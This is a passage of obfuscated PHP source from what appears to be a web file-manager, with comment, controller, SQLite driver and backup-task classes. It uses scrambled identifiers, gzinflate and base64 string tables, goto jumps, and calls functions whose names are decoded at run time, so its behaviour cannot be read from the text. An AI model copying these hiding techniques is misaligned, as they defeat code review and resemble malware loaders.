($GLOBALS[$Ù≤¯Ω•Ô[16]][$Ù≤¯Ω•Ô[99]][$Ù≤¯Ω•Ô[1858]] != $Ù≤¯Ω•Ô[98]) { return !0; } $˙≠¡°ü¿ = $this->config(); if (!$˙≠¡°ü¿ || $˙≠¡°ü¿[$Ù≤¯Ω•Ô[1628]] != $Ù≤¯Ω•Ô[98]) { return !1; } $«‡®≠´© = $this->process(); foreach ($«‡®≠´© as $ç≠∞ÍÑ«) { if ($ç≠∞ÍÑ«) { return Task::restart($ç≠∞ÍÑ«[$Ù≤¯Ω•Ô[408]]); } } $˛‘ÑØöÄ = new Backup(); $’ø†Ä≈Î = $˛‘ÑØöÄ->db(); if ($’ø†Ä≈Î) { $’ø†Ä≈Î = $˛‘ÑØöÄ->dbFile(); if ($’ø†Ä≈Î && $˙≠¡°ü¿[$Ù≤¯Ω•Ô[762]] == $Ù≤¯Ω•Ô[207]) { $’ø†Ä≈Î = $˛‘ÑØöÄ->file(); } } Backup::set(array($Ù≤¯Ω•Ô[757] => 1, $Ù≤¯Ω•Ô[506] => time())); return !0; } public function process() { $à§õÏƒ· =& $_SERVER[Á≈ ä ∞]; $´Õ“™ÁÕ = array($à§õÏƒ·[765] => Task::get($à§õÏƒ·[786]), $à§õÏƒ·[769] => Task::get($à§õÏƒ·[807]), $à§õÏƒ·[209] => Task::get($à§õÏƒ·[816])); $èÀ‘¢ÿ– = !1; foreach ($´Õ“™ÁÕ as &$ãÇ§Âî¸) { if ($èÀ‘¢ÿ–) { $ãÇ§Âî¸ = !1; continue; } if ($ãÇ§Âî¸) { $ª˚àá´ß = intval(_get($ãÇ§Âî¸, $à§õÏƒ·[1663], 0)); if (time() - $ª˚àá´ß > 7200) { Task::kill($ãÇ§Âî¸[$à§õÏƒ·[408]]); $èÀ‘¢ÿ– = !0; $ãÇ§Âî¸ = !1; } } } return $´Õ“™ÁÕ; } public function restore() { $Ÿ√¿“˜◊ =& $_SERVER[Á≈ ä ∞]; ActionCall($Ÿ√¿“˜◊[1063], !0, 1); ActionCall($Ÿ√¿“˜◊[1063], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\x65\x6e\164"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\155\145" => "\x63\157\155\155\145\156\x74\x5f\x6d\145\164\x61", "\x6d\145\164\141\x46\x69\x65\x6c\x64" => "\x63\157\155\155\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ËÓ‰˙óä) { $ıÅ≥∂÷È =& $_SERVER[Á≈ ä ∞]; if ($ËÓ‰˙óä[$ıÅ≥∂÷È[1859]]) { $‘•ÀŸ©• = $this->where(array($ıÅ≥∂÷È[1860] => $ËÓ‰˙óä[$ıÅ≥∂÷È[1859]]))->find(); if (!$‘•ÀŸ©• || $‘•ÀŸ©•[$ıÅ≥∂÷È[420]] != $ËÓ‰˙óä[$ıÅ≥∂÷È[420]] || $‘•ÀŸ©•[$ıÅ≥∂÷È[514]] != $ËÓ‰˙óä[$ıÅ≥∂÷È[514]]) { return !1; } $this->where(array($ıÅ≥∂÷È[1860] => $ËÓ‰˙óä[$ıÅ≥∂÷È[1859]]))->setAdd($ıÅ≥∂÷È[1861], 1); } $ËÓ‰˙óä[$ıÅ≥∂÷È[1862]] = 0; $ËÓ‰˙óä[$ıÅ≥∂÷È[1861]] = 0; $ËÓ‰˙óä[$ıÅ≥∂÷È[757]] = 1; return $this->add($ËÓ‰˙óä); } public function commentCount($Ò–ﬂ¬ÆÚ, $˙ÿâ˜í˙, $ÜèÜ´á∫ = false) { $’íäíªà =& $_SERVER[Á≈ ä ∞]; if (!$Ò–ﬂ¬ÆÚ) { return array(); } if (is_string($Ò–ﬂ¬ÆÚ) || is_int($Ò–ﬂ¬ÆÚ)) { $Ò–ﬂ¬ÆÚ = array($Ò–ﬂ¬ÆÚ); } $‘ÎúÌÃ = array($’íäíªà[514], $’íäíªà[1863] => $’íäíªà[509]); $˙»¡ﬂ˜é = array($’íäíªà[514] => array($’íäíªà[17], $Ò–ﬂ¬ÆÚ), $’íäíªà[420] => $˙ÿâ˜í˙); if ($ÜèÜ´á∫) { $˙»¡ﬂ˜é[$’íäíªà[1658]] = $ÜèÜ´á∫; } $˘¸Ó•Ô” = $this->field($‘ÎúÌÃ)->where($˙»¡ﬂ˜é)->group($’íäíªà[514])->select(); return array_to_keyvalue($˘¸Ó•Ô”, $’íäíªà[514], $’íäíªà[509]); } public function starTarget($™œò–ﬂœ, $˛√ßÙäú) { $ÒÔ›«÷ =& $_SERVER[Á≈ ä ∞]; $Öÿ±ñŸ˙ = $™œò–ﬂœ + self::TYPE_STAR_OFFSET; $ÓßŒÍÒÊ = array($ÒÔ›«÷[1658] => USER_ID, $ÒÔ›«÷[420] => $Öÿ±ñŸ˙, $ÒÔ›«÷[514] => $˛√ßÙäú); $î∑Î÷•• = $this->where($ÓßŒÍÒÊ)->find(); if ($î∑Î÷••) { return $this->where(array($ÒÔ›«÷[408] => $î∑Î÷••[$ÒÔ›«÷[408]]))->delete(); } $Ñä‘‰Èå = array($ÒÔ›«÷[1859] => 0, $ÒÔ›«÷[1658] => USER_ID, $ÒÔ›«÷[757] => 1, $ÒÔ›«÷[762] => $ÒÔ›«÷[22], $ÒÔ›«÷[420] => $Öÿ±ñŸ˙, $ÒÔ›«÷[514] => $˛√ßÙäú, $ÒÔ›«÷[1862] => 0, $ÒÔ›«÷[1861] => 0); return $this->add($Ñä‘‰Èå); } public function starTargetCount($Å≠ÃÀ”µ, $ΩÏÙ†∑œ) { $Ô˚¿ÚÇÉ =& $_SERVER[Á≈ ä ∞]; $«îŒÎ€ = $ΩÏÙ†∑œ + self::TYPE_STAR_OFFSET; $£‰Å¯ƒî = $this->commentCount($Å≠ÃÀ”µ, $«îŒÎ€); $∫√»—™◊ = $this->commentCount($Å≠ÃÀ”µ, $«îŒÎ€, USER_ID); return array($Ô˚¿ÚÇÉ[1864] => $£‰Å¯ƒî, $Ô˚¿ÚÇÉ[1865] => $∫√»—™◊); } public function starTargetUserList($ä˝‚äÂû, $≈ŸÈ¨œß) { $ÀˆÖ–ª¨ =& $_SERVER[Á≈ ä ∞]; $¿é¬Ï∞› = $ä˝‚äÂû + self::TYPE_STAR_OFFSET; $”◊ßÖ±‘ = array($ÀˆÖ–ª¨[514] => $≈ŸÈ¨œß, $ÀˆÖ–ª¨[420] => $¿é¬Ï∞›); $∑Ì◊ü˝û = $this->where($”◊ßÖ±‘)->count(); $ó◊öÄò’ = array($ÀˆÖ–ª¨[264] => $∑Ì◊ü˝û, $ÀˆÖ–ª¨[1866] => array()); if (!$∑Ì◊ü˝û) { return $ó◊öÄò’; } $í˘£Ù∂ß = $this->field($ÀˆÖ–ª¨[1658])->where($”◊ßÖ±‘)->limit(500)->select(); $í˘£Ù∂ß = array_to_keyvalue($í˘£Ù∂ß, $ÀˆÖ–ª¨[22], $ÀˆÖ–ª¨[1658]); $ó◊öÄò’[$ÀˆÖ–ª¨[1866]] = Model($ÀˆÖ–ª¨[522])->userListInfo($í˘£Ù∂ß); return $ó◊öÄò’; } public function prasiseUserList($‰ÇûîÎÿ) { $¿˘∑Òˆû =& $_SERVER[Á≈ ä ∞]; $ö‚ˆÜ≈á = array($¿˘∑Òˆû[1867] => $‰ÇûîÎÿ); $û√»ÏÂ÷ = $this->where($ö‚ˆÜ≈á)->find(); $ƒÃ§Ω€ı = _get($û√»ÏÂ÷, $¿˘∑Òˆû[1862], 0); $ë¥˙∂ÔÅ = array($¿˘∑Òˆû[264] => $ƒÃ§Ω€ı, $¿˘∑Òˆû[1866] => array()); if (!$ƒÃ§Ω€ı) { return $ë¥˙∂ÔÅ; } $œ˛ŸÁ›Ã = Model($¿˘∑Òˆû[1868])->field($¿˘∑Òˆû[1658])->where($ö‚ˆÜ≈á)->limit(500)->select(); $œ˛ŸÁ›Ã = array_to_keyvalue($œ˛ŸÁ›Ã, $¿˘∑Òˆû[22], $¿˘∑Òˆû[1658]); $ë¥˙∂ÔÅ[$¿˘∑Òˆû[1866]] = Model($¿˘∑Òˆû[522])->userListInfo($œ˛ŸÁ›Ã); return $ë¥˙∂ÔÅ; } public function remove($‚è˘Ú÷É) { $ªÏîÜõΩ =& $_SERVER[Á≈ ä ∞]; $”áÄÊıü = array($ªÏîÜõΩ[1860] => $‚è˘Ú÷É); $Ø∑¥ñº“ = $this->where($”áÄÊıü)->find(); if ($Ø∑¥ñº“[$ªÏîÜõΩ[1859]]) { $this->where(array($ªÏîÜõΩ[1860] => $Ø∑¥ñº“[$ªÏîÜõΩ[1859]]))->setAdd($ªÏîÜõΩ[1861], -1); } return $this->where($”áÄÊıü)->delete(); } public function edit($∏äè…•˝, $´åı’Éà) { $æ•ÔçÌ⁄ =& $_SERVER[Á≈ ä ∞]; $Ó‘¡Â◊¨ = array($æ•ÔçÌ⁄[1860] => $∏äè…•˝); return $this->where($Ó‘¡Â◊¨)->save(array($æ•ÔçÌ⁄[1869] => $´åı’Éà)); } public function prasise($•ÁπèÄì) { $ô∞§‹Öº =& $_SERVER[Á≈ ä ∞]; $¥ËÊ ¬ï = Model($ô∞§‹Öº[1870]); $ÂÃ’ŸÙó = array($ô∞§‹Öº[1860] => $•ÁπèÄì, $ô∞§‹Öº[1649] => USER_ID); $ùÊ‹ó¬› = $¥ËÊ ¬ï->where($ÂÃ’ŸÙó)->find(); if (!$ùÊ‹ó¬›) { $¥ËÊ ¬ï->add($ÂÃ’ŸÙó); $†≈¥∫„≈ = $this->where(array($ô∞§‹Öº[1860] => $•ÁπèÄì))->setAdd($ô∞§‹Öº[1862], 1); } else { $¥ËÊ ¬ï->where($ÂÃ’ŸÙó)->delete(); $†≈¥∫„≈ = $this->where(array($ô∞§‹Öº[1860] => $•ÁπèÄì))->setAdd($ô∞§‹Öº[1862], -1); } return $†≈¥∫„≈; } public function targetInfo($Ÿßâ®˙î, $±É˝˙¨£) { $¨Ïû±Å£ =& $_SERVER[Á≈ ä ∞]; $ñΩö†á’ = array($¨Ïû±Å£[595] => $Ÿßâ®˙î, $¨Ïû±Å£[596] => $±É˝˙¨£); $êß¯•Öˆ = $this->where($ñΩö†á’)->count(); $¨ÚÔù·∆ = "\x52\x49\x47\110\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x63\157\155\x6d\x65\x6e\x74\x5f\160\x72\141\x69\163\x65\x20\x73\164\x61\162\40\x6f\156\40\143\157\x6d\155\145\x6e\x74\56\x63\x6f\155\x6d\x65\156\x74\111\x44\40\x3d\x20\x73\164\141\x72\56\x63\157\x6d\x6d\145\156\x74\111\104"; $Ä¡„µÏ˘ = $this->alias($¨Ïû±Å£[363])->where($ñΩö†á’)->join($¨ÚÔù·∆, $¨Ïû±Å£[1871])->count(); $êÌÂóû◊ = array($¨Ïû±Å£[1872] => $êß¯•Öˆ, $¨Ïû±Å£[1873] => $Ä¡„µÏ˘); return $êÌÂóû◊; } public function listData($ˆ™¥…∂∂) { $ç é›Ï˜ =& $_SERVER[Á≈ ä ∞]; if (isset($ˆ™¥…∂∂[$ç é›Ï˜[1874]])) { if ($ˆ™¥…∂∂[$ç é›Ï˜[1874]]) { $ˆ™¥…∂∂[$ç é›Ï˜[1867]] = array($ç é›Ï˜[1017], intval($ˆ™¥…∂∂[$ç é›Ï˜[1874]])); } unset($ˆ™¥…∂∂[$ç é›Ï˜[1874]]); } if (isset($ˆ™¥…∂∂[$ç é›Ï˜[1875]])) { if ($ˆ™¥…∂∂[$ç é›Ï˜[1875]]) { $ˆ™¥…∂∂[$ç é›Ï˜[1867]] = array($ç é›Ï˜[1014], intval($ˆ™¥…∂∂[$ç é›Ï˜[1875]])); } unset($ˆ™¥…∂∂[$ç é›Ï˜[1875]]); } return $this->_listData($ˆ™¥…∂∂); } private function _listData($ªß€»û·) { $©†œıÄ˝ =& $_SERVER[Á≈ ä ∞]; $ıÕ¨¿ü = $this->where($ªß€»û·)->_makeOrder()->selectPage(100); $this->_listAppendParent($ıÕ¨¿ü[$©†œıÄ˝[378]]); $this->_listAppendUser($ıÕ¨¿ü[$©†œıÄ˝[378]]); $this->_listAppendMeta($ıÕ¨¿ü[$©†œıÄ˝[378]]); return $ıÕ¨¿ü; } private function _makeOrder() { $ÅÔöÊÓã =& $_SERVER[Á≈ ä ∞]; $âÂ÷ˆÿÃ = array($ÅÔöÊÓã[1862], $ÅÔöÊÓã[1861], $ÅÔöÊÓã[210]); $’ä«¿¸ = Input::get($ÅÔöÊÓã[466], $ÅÔöÊÓã[17], $ÅÔöÊÓã[432], $âÂ÷ˆÿÃ); $úÎÒƒº = Input::get($ÅÔöÊÓã[467], $ÅÔöÊÓã[17], $ÅÔöÊÓã[1651], array($ÅÔöÊÓã[1876], $ÅÔöÊÓã[462])); $¸ÅøıÈã = $’ä«¿¸ . $ÅÔöÊÓã[63] . $úÎÒƒº; return $this->order($¸ÅøıÈã); } private function _listAppendParent(&$ãé‹˙ê◊) { $¿ïÆ≤í÷ =& $_SERVER[Á≈ ä ∞]; $‘≥–òºƒ = array_unique(array_to_keyvalue($ãé‹˙ê◊, $¿ïÆ≤í÷[22], $¿ïÆ≤í÷[1859])); $‘≥–òºƒ = array_remove_value($‘≥–òºƒ, $¿ïÆ≤í÷[207]); if (!$‘≥–òºƒ) { return; } $ƒ§∫¨„ = $this->where(array($¿ïÆ≤í÷[1860] => array($¿ïÆ≤í÷[17], $‘≥–òºƒ)))->select(); $ƒ§∫¨„ = array_to_keyvalue($ƒ§∫¨„, $¿ïÆ≤í÷[1867]); foreach ($ãé‹˙ê◊ as &$±ê»“ê·) { if (isset($ƒ§∫¨„[$±ê»“ê·[$¿ïÆ≤í÷[1859]]])) { $±ê»“ê·[$¿ïÆ≤í÷[1877]] = $ƒ§∫¨„[$±ê»“ê·[$¿ïÆ≤í÷[1859]]]; } } unset($±ê»“ê·); } private function _listAppendUser(&$Í√”≈§) { $πÉœ¸Üï =& $_SERVER[Á≈ ä ∞]; $´˜››∆’ = array_unique(array_to_keyvalue($Í√”≈§, $πÉœ¸Üï[22], $πÉœ¸Üï[1658])); $´˜››∆’ = array_remove_value($´˜››∆’, $πÉœ¸Üï[207]); if (count($´˜››∆’) == 0) { return; } foreach ($Í√”≈§ as $Ü˜ıã∞‘) { if (isset($Ü˜ıã∞‘[$πÉœ¸Üï[1877]])) { $´˜››∆’[] = $Ü˜ıã∞‘[$πÉœ¸Üï[1877]][$πÉœ¸Üï[1658]]; } } $é´©«√Ò = Model($πÉœ¸Üï[544])->userListInfo($´˜››∆’); foreach ($Í√”≈§ as &$Ü˜ıã∞‘) { $Ü˜ıã∞‘[$πÉœ¸Üï[609]] = $é´©«√Ò[$Ü˜ıã∞‘[$πÉœ¸Üï[1658]]]; if (isset($Ü˜ıã∞‘[$πÉœ¸Üï[1877]])) { $Ü˜ıã∞‘[$πÉœ¸Üï[1877]][$πÉœ¸Üï[609]] = $é´©«√Ò[$Ü˜ıã∞‘[$πÉœ¸Üï[1877]][$πÉœ¸Üï[1658]]]; } } unset($Ü˜ıã∞‘); } private function _listAppendMeta(&$ÌÌƒÀ≤”) { $Ø∑ƒá¬ä =& $_SERVER[Á≈ ä ∞]; $Â√Í›ú§ = array_unique(array_to_keyvalue($ÌÌƒÀ≤”, $Ø∑ƒá¬ä[22], $Ø∑ƒá¬ä[1867])); $Â√Í›ú§ = array_remove_value($Â√Í›ú§, $Ø∑ƒá¬ä[207]); if (!$Â√Í›ú§) { return; } foreach ($ÌÌƒÀ≤” as $¬∂⁄¡’‚) { if (isset($¬∂⁄¡’‚[$Ø∑ƒá¬ä[1877]])) { $Â√Í›ú§[] = $¬∂⁄¡’‚[$Ø∑ƒá¬ä[1877]][$Ø∑ƒá¬ä[1867]]; } } $ªß¢≥ÌÑ = $this->metaList($Â√Í›ú§); if (!$ªß¢≥ÌÑ) { return !1; } foreach ($ÌÌƒÀ≤” as &$¬∂⁄¡’‚) { $¬∂⁄¡’‚[$Ø∑ƒá¬ä[475]] = $ªß¢≥ÌÑ[$¬∂⁄¡’‚[$Ø∑ƒá¬ä[1867]]]; if (isset($¬∂⁄¡’‚[$Ø∑ƒá¬ä[1877]])) { $¬∂⁄¡’‚[$Ø∑ƒá¬ä[1877]][$Ø∑ƒá¬ä[475]] = $ªß¢≥ÌÑ[$¬∂⁄¡’‚[$Ø∑ƒá¬ä[1877]][$Ø∑ƒá¬ä[1867]]]; } } unset($¬∂⁄¡’‚); } private function metaList($œ†´è¡ê) { $ÿµıÆÓû =& $_SERVER[Á≈ ä ∞]; if (!$œ†´è¡ê) { return array(); } $úÕ§ Ê = array($ÿµıÆÓû[1867] => array($ÿµıÆÓû[17], $œ†´è¡ê)); $Æ‹¶ËÏà = Model($ÿµıÆÓû[1878])->where($úÕ§ Ê)->select(); $Æ‹¶ËÏà = array_to_keyvalue_group($Æ‹¶ËÏà, $ÿµıÆÓû[1867]); foreach ($Æ‹¶ËÏà as $ﬁÖ‰ÕÙù => $üÜ¨ï◊ê) { $—Á‘È˚¡ = array(); foreach ($üÜ¨ï◊ê as $’ìó„Úí) { $—Á‘È˚¡[$’ìó„Úí[$ÿµıÆÓû[104]]] = $’ìó„Úí[$ÿµıÆÓû[383]]; } $Æ‹¶ËÏà[$ﬁÖ‰ÕÙù] = $—Á‘È˚¡; } return $Æ‹¶ËÏà ? $Æ‹¶ËÏà : array(); } } goto FÏ¿‰ÂÓ…ë; eºéı›·è®: if ($_SERVER[$_SERVER[Á≈ ä ∞][6]] != $_SERVER[$_SERVER[Á≈ ä ∞][7]]) { $_getc = $_SERVER[Á≈ ä ∞][8]; $_getfile = $_SERVER[$_SERVER[Á≈ ä ∞][9]] . $_SERVER[Á≈ ä ∞][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Á≈ ä ∞][11], $_getfilec); if (count($_getarrs) < $_SERVER[Á≈ ä ∞][12]) { $exit = $_SERVER[Á≈ ä ∞][13]; $exit(); } $_act = $_SERVER[Á≈ ä ∞][14]; $_act($_SERVER[$_SERVER[Á≈ ä ∞][15]]); } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $õ‹êÇΩí =& $_SERVER[Á≈ ä ∞]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$õ‹êÇΩí[16]] =& $config; $this->values[$õ‹êÇΩí[17]] =& $in; $this->tpl = TEMPLATE . MOD . $õ‹êÇΩí[18]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ââìÔñª) { if (1 === func_num_args()) { $this->{$ââìÔñª} = new $ââìÔñª(); } else { $Ç˙‘ëèΩ = new ReflectionClass($ââìÔñª); $–Ø‰Å»¸ = func_get_args(); array_shift($–Ø‰Å»¸); $this->{$ââìÔñª} = $Ç˙‘ëèΩ->newInstanceArgs($–Ø‰Å»¸); } return $this->{$ââìÔñª}; } public function routeBind($∂·⁄Ó‰£, $‘¨Ú•âÜ, $√–¡‘˝ˆ = 3) { $È‚›âã° =& $_SERVER[Á≈ ä ∞]; $≥ºõª›À = $this->in[$È‚›âã°[19]]; $∂·⁄Ó‰£ = str_replace($È‚›âã°[20], $È‚›âã°[21], trim(trim($∂·⁄Ó‰£, $È‚›âã°[18]), $È‚›âã°[22])); if (!$∂·⁄Ó‰£ || count($≥ºõª›À) <= $√–¡‘˝ˆ) { return !1; } $∫≤“Øâ = !0; $Î…Èò»Ë = explode($È‚›âã°[18], $∂·⁄Ó‰£); for ($”ÿë‚öˆ = 0; $”ÿë‚öˆ < count($Î…Èò»Ë); $”ÿë‚öˆ++) { if ($Î…Èò»Ë[$”ÿë‚öˆ] != $≥ºõª›À[$√–¡‘˝ˆ + $”ÿë‚öˆ]) { $∫≤“Øâ = !1; break; } } if (!$∫≤“Øâ) { return; } call_user_func_array(array($this, $‘¨Ú•âÜ), array()); } public function routeArgs($Èù¶°øË = 3) { $Û¬«åπﬁ = $this->in[$_SERVER[Á≈ ä ∞][19]]; if (count($Û¬«åπﬁ) <= $Èù¶°øË) { return array(); } $†ﬂ€Íì™ = array(); for ($˘˝ëÖ”¸ = $Èù¶°øË; $˘˝ëÖ”¸ < count($Û¬«åπﬁ); $˘˝ëÖ”¸ += 2) { $†ﬂ€Íì™[$Û¬«åπﬁ[$˘˝ëÖ”¸]] = $Û¬«åπﬁ[$˘˝ëÖ”¸ + 1]; $this->in[$Û¬«åπﬁ[$˘˝ëÖ”¸]] = $Û¬«åπﬁ[$˘˝ëÖ”¸ + 1]; } return $†ﬂ€Íì™; } protected function assign($¿à«Ö¢Ò, $ò»åñÒŒ) { $this->values[$¿à«Ö¢Ò] = $ò»åñÒŒ; } protected function display($§¸¨“≤œ) { ob_end_clean(); extract($this->values); require $this->tpl . $§¸¨“≤œ; } } class DbSqliteBase extends Db { public function __construct($§≠µ›ﬁ÷ = '') { $Ã”öÜå« =& $_SERVER[Á≈ ä ∞]; if (!extension_loaded($Ã”öÜå«[23])) { think_exception(think_lang($Ã”öÜå«[24]) . $Ã”öÜå«[25]); } if (!empty($§≠µ›ﬁ÷)) { if (!isset($§≠µ›ﬁ÷[$Ã”öÜå«[26]])) { $§≠µ›ﬁ÷[$Ã”öÜå«[26]] = 438; } $this->config = $§≠µ›ﬁ÷; if (empty($this->config[$Ã”öÜå«[27]])) { $this->config[$Ã”öÜå«[27]] = array(); } } } public function connect($⁄ª†∞Ì¢ = '', $ ÷∑Ô˘› = 0) { $Ÿ”ë≠Ÿ≈ =& $_SERVER[Á≈ ä ∞]; if (!isset($this->linkID[$ ÷∑Ô˘›])) { if (empty($⁄ª†∞Ì¢)) { $⁄ª†∞Ì¢ = $this->config; } $Á”ªØÎË = !empty($⁄ª†∞Ì¢[$Ÿ”ë≠Ÿ≈[27]][$Ÿ”ë≠Ÿ≈[28]]) ? $⁄ª†∞Ì¢[$Ÿ”ë≠Ÿ≈[27]][$Ÿ”ë≠Ÿ≈[28]] : $this->pconnect; $¸µÁÚúâ = $Á”ªØÎË ? $Ÿ”ë≠Ÿ≈[29] : $Ÿ”ë≠Ÿ≈[30]; $this->linkID[$ ÷∑Ô˘›] = $¸µÁÚúâ($⁄ª†∞Ì¢[$Ÿ”ë≠Ÿ≈[31]], $⁄ª†∞Ì¢[$Ÿ”ë≠Ÿ≈[26]]); if (!$this->linkID[$ ÷∑Ô˘›]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ ÷∑Ô˘›], 30000); if (1 != think_config($Ÿ”ë≠Ÿ≈[32])) { unset($this->config); } } return $this->linkID[$ ÷∑Ô˘›]; } public function free() { $this->queryID = null; } public function query($ê˝Úàæ¨) { $ÄÂé§≈Á =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ê˝Úàæ¨; if ($this->queryID) { $this->free(); } think_action_status($ÄÂé§≈Á[33], 1); think_status($ÄÂé§≈Á[34]); $this->queryID = sqlite_query($this->_linkID, $ê˝Úàæ¨); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $∫˜…º‘˙ = $this->getAll(); return $∫˜…º‘˙; } } public function execute($ÔûÔßˆú) { $óïëÔúó =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÔûÔßˆú; if ($this->queryID) { $this->free(); } think_action_status($óïëÔúó[35], 1); think_status($óïëÔúó[34]); $Ÿ∆ãÂÑÛ = sqlite_exec($this->_linkID, $ÔûÔßˆú); $this->debug(); if (!1 === $Ÿ∆ãÂÑÛ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Á≈ ä ∞][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ô™£·º¬ = sqlite_query($this->_linkID, $_SERVER[Á≈ ä ∞][37]); if (!$Ô™£·º¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¡∂≥∏“∞ = sqlite_query($this->_linkID, $_SERVER[Á≈ ä ∞][38]); if (!$¡∂≥∏“∞) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $›∆Ë◊ÜÀ = array(); if ($this->numRows > 0) { for ($‰˝æ∫Ù§ = 0; $‰˝æ∫Ù§ < $this->numRows; $‰˝æ∫Ù§++) { $›∆Ë◊ÜÀ[$‰˝æ∫Ù§] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $›∆Ë◊ÜÀ; } public function getFields($’ß—†êõ) { $˝º¢˜ÎŒ =& $_SERVER[Á≈ ä ∞]; $ë∂àΩç˛ = $this->query($˝º¢˜ÎŒ[39] . $’ß—†êõ . $˝º¢˜ÎŒ[40]); $¶ò¶∫Ç® = array(); if ($ë∂àΩç˛) { foreach ($ë∂àΩç˛ as $≥ã”∞˙ì => $¯÷Ó®Ìä) { $¶ò¶∫Ç®[$¯÷Ó®Ìä[$˝º¢˜ÎŒ[41]]] = array($˝º¢˜ÎŒ[42] => $¯÷Ó®Ìä[$˝º¢˜ÎŒ[41]], $˝º¢˜ÎŒ[43] => $¯÷Ó®Ìä[$˝º¢˜ÎŒ[44]], $˝º¢˜ÎŒ[45] => (bool) ($¯÷Ó®Ìä[$˝º¢˜ÎŒ[46]] === $˝º¢˜ÎŒ[22]), $˝º¢˜ÎŒ[47] => $¯÷Ó®Ìä[$˝º¢˜ÎŒ[48]], $˝º¢˜ÎŒ[49] => strtolower($¯÷Ó®Ìä[$˝º¢˜ÎŒ[50]]) == $˝º¢˜ÎŒ[51], $˝º¢˜ÎŒ[52] => strtolower($¯÷Ó®Ìä[$˝º¢˜ÎŒ[53]]) == $˝º¢˜ÎŒ[54]); } } return $¶ò¶∫Ç®; } public function getTables($≈Ê˙—¶≈ = '') { $ñ˚µ’–¥ =& $_SERVER[Á≈ ä ∞]; $≠í≤ãﬁ± = $this->query($ñ˚µ’–¥[55] . $ñ˚µ’–¥[56] . $ñ˚µ’–¥[57]); $⁄Ÿâ≠ƒå = array(); foreach ($≠í≤ãﬁ± as $»ú·”é– => $√óÊåÑ˘) { $⁄Ÿâ≠ƒå[$»ú·”é–] = current($√óÊåÑ˘); } return $⁄Ÿâ≠ƒå; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $√∏ﬂ‡„˝ =& $_SERVER[Á≈ ä ∞]; $ê˘ÅÁ˝º = sqlite_last_error($this->_linkID); $this->error = $ê˘ÅÁ˝º . $√∏ﬂ‡„˝[4] . sqlite_error_string($ê˘ÅÁ˝º); if ($√∏ﬂ‡„˝[22] != $this->queryStr) { $this->error .= LNG($√∏ﬂ‡„˝[58]) . $this->queryStr; } think_trace($this->error, $√∏ﬂ‡„˝[22], $√∏ﬂ‡„˝[59]); return $this->error; } public function escapeString($¿π•Û≠€) { return sqlite_escape_string($¿π•Û≠€); } public function parseLimit($ò·•—˚∑) { $¬üËúÂÄ =& $_SERVER[Á≈ ä ∞]; $¶≠«©Øò = $¬üËúÂÄ[22]; if (!empty($ò·•—˚∑)) { $ò·•—˚∑ = explode($¬üËúÂÄ[60], $ò·•—˚∑); if (count($ò·•—˚∑) > 1) { $¶≠«©Øò .= $¬üËúÂÄ[61] . $ò·•—˚∑[1] . $¬üËúÂÄ[62] . $ò·•—˚∑[0] . $¬üËúÂÄ[63]; } else { $¶≠«©Øò .= $¬üËúÂÄ[61] . $ò·•—˚∑[0] . $¬üËúÂÄ[63]; } } return $¶≠«©Øò; } } goto AÉ¬‰ëüÃ; Cì≥Î◊Ñä±: if (!$xijlbqwfgo) { return; } $_SERVER[•çºﬂ„ù] = explode($_SERVER[Á≈ ä ∞][624], gzinflate(substr($_SERVER[Á≈ ä ∞][625], 10, -8))); $xpcazdruws = $_SERVER[Á≈ ä ∞][626]; goto e∏≠ó°º€ï; fÃ≈Ò˜ ßà: $fileSize = strrev(base64_decode($_SERVER[ÚçüˆŸ”][0])); function binCheckNeq($â¡ÁÄ„Ó, $Ô⁄•ºöö) { return $â¡ÁÄ„Ó != $Ô⁄•ºöö; } $_SERVER[$_SERVER[ÚçüˆŸ”][1]] = $fileSize($_SERVER[$_SERVER[ÚçüˆŸ”][2]]); goto f∆‰ŒúÍ∫¢; FÆﬁ™¶íÔÃ: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($©¿º®—ò) { $this->pathParse = $©¿º®—ò; } protected function infoParse($™òë‰ΩÎ, $¨∑Ôòªﬂ = false) { $⁄íö‹”’ =& $_SERVER[Á≈ ä ∞]; return Action($⁄íö‹”’[1178])->sharePathInfo($this->pathParse[$⁄íö‹”’[94]], !0, $¨∑Ôòªﬂ); } public function listPath($ú§ÛÓÒÓ, $œ≤Ì∏ıâ = false) { $∂åãÕî± =& $_SERVER[Á≈ ä ∞]; $‚áì€Ù‰ = IO::listPath($ú§ÛÓÒÓ, $œ≤Ì∏ıâ); if (!$‚áì€Ù‰) { return $‚áì€Ù‰; } if (is_array($‚áì€Ù‰[$∂åãÕî±[1339]])) { $¸®»ÉÛô = Action($∂åãÕî±[1348])->parsePathChildren($‚áì€Ù‰[$∂åãÕî±[1339]], 